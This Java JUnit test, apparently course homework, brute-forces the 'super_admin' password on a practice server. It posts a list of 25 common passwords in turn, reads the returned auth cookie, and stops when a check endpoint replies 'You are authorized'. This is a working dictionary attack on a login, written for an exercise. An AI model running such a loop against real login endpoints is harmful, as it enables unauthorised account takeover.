import io.restassured.RestAssured;
import io.restassured.http.Headers;
import io.restassured.path.json.JsonPath;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.awt.*;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;


public class PasswordTest {

    @Test
    public void getPassword() {
        String login = "super_admin";
        String[] passwordList = {"123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345",
                "iloveyou", "111111", "123123", "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555",
                "lovely", "7777777", "welcome", "888888", "princess", "dragon", "password1", "123qwe"};
        String password;

        for (int i = 0; i < passwordList.length; i++) {
            password = passwordList[i];
            Map<String, String> data = new HashMap<>();
            data.put("login", login);
            data.put("password", password);

            Response response = RestAssured
                    .given()
                    .body(data)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();
            String responseCookie = response.getCookie("auth_cookie");
            Map<String, String> cookies = new HashMap<>();
            cookies.put("auth_cookie", responseCookie);

            Response response2 = RestAssured
                    .given()
                    .body(data)
                    .cookies(cookies)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();
            String answer = response2.asString();
            String success = "You are authorized";
            if (answer.equals(success)) {
                System.out.println(answer);
                System.out.println(password);
                break;
            }
        }
    }

}